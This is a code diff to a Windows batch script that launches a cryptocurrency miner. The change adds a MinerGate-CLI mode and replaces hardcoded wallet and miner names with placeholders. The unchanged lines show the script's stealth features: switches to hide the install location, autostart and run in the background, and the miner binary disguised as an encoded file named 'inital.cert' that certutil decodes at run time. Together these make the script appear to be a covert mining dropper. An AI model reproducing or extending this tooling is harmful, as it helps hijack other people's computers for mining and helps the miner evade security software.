@@ -29,6 +29,8 @@ REM MINEREXTRAS  - PULLS THE EXTRA DLL FILES WITH THE MINER. ONLY USE
 REM                IF THE MINER REQUIRES EXTRA DLL'S. 
 REM MASTERWALLET - USES ONE SET OF WALLET/PASS FOR ALL POOLS. (IF "NO"
 REM                SCRIPT WILL USE CREDENTIALS FROM POOL LIST)
+REM MINERGATE    - ALLOWS MINING USING MINERGATE-CLI (REMOVES ALGO,
+REM                SERVER, FROM MINING COMMAND)
 REM MUTLIPOOL    - CHOOSE BETWEEN MULTIPLE POOLS (1,2,3,4,5) USING THE
 REM                "POOLNUM" VARIABLE. (DEFAULTS TO POOL #1)
 REM 
@@ -53,6 +55,7 @@ SET "HIDELOCATION=NO"
 SET "MINEREXTRAS=NO"
 SET "AUTOSTART=NO"
 SET "MASTERWALLET=YES"
+SET "MINERGATE=NO"
 REM ============================================================================
 REM MULTI-POOL CHOICE: (IF "NO" DEFAULTS TO POOL #1)
 REM ============================================================================
@@ -63,7 +66,7 @@ REM MINER CREDENTIALS:
 REM ============================================================================
 REM MASTER WALLET/USER & PASS: (IF "NO" SCRIPT USES NORMAL POOL CREDENTIALS)
 REM ============================================================================
-SET "MWALLET=MASTER_WALLET_HERE"
+SET "MWALLET=MASTER_WALLET_OR_EMAIL"
 SET "MPASS=MASTER_PASSWORD_HERE"
 REM ============================================================================
 REM POOL #1 (DEFAULT POOL)
@@ -123,7 +126,7 @@ REM
 REM =============================================================================
 REM Script Variables
 REM =============================================================================
-SET "ORIGMINER=xmrig.exe"
+SET "ORIGMINER=MINER_EXE_HERE.exe"
 SET "MINEREXTRAFILES=msvcr110.dll"
 SET "ENCRYPTED=inital.cert"
 SET "DECRYPTED=%MINER%"
@@ -135,7 +138,7 @@ SET "SFLAG=-o"
 SET "PFLAG=-p"
 SET "UFLAG=-u"
 SET "PASSFLAG=-p"
-SET "CUSTOMFLAGS=--av=0 --donate-level=1 --cpu-priority=0"
+SET "CUSTOMFLAGS="
 SET "ENCRYPT=certutil -encode"
 SET "DECRYPT=certutil -decode"
 REM Set "TARGETDIR" to the Directory Location, Set "TARGETDIRNAME" to the Name of the Folder.
@@ -204,6 +207,7 @@ IF "%MULTIPOOL%" EQU "YES" (
 )
 REM Master Wallet/Password Helper variables.
 IF "%MASTERWALLET%" EQU "YES" (SET "USER=%MWALLET%" && SET "PASS=%MPASS%")
+IF "%MINERGATE%" EQU "YES" (SET "MINERGATE=1" && SET "UFLAG=--user") ELSE (SET "MINERGATE=0")
 REM +------------------------+
 REM |    Debugging Options   |
 REM +------------------------+
@@ -295,7 +299,11 @@ IF "%BACKGROUND%" EQU "1" (
 		echo Custom Flags  : %CUSTOMFLAGS%
 		pause>NUL
 	)
+	IF "%MINERGATE%" EQU "1" (
+	%MINER% %UFLAG% %USER% %SERVER% %CUSTOMFLAGS%
+	) ELSE (
 	%MINER% %SFLAG% %SERVER% %UFLAG% %USER% %PFLAG% %PORT% %PASSFLAG% %PASS% %CUSTOMFLAGS%
+	)
 )
 GOTO END
 
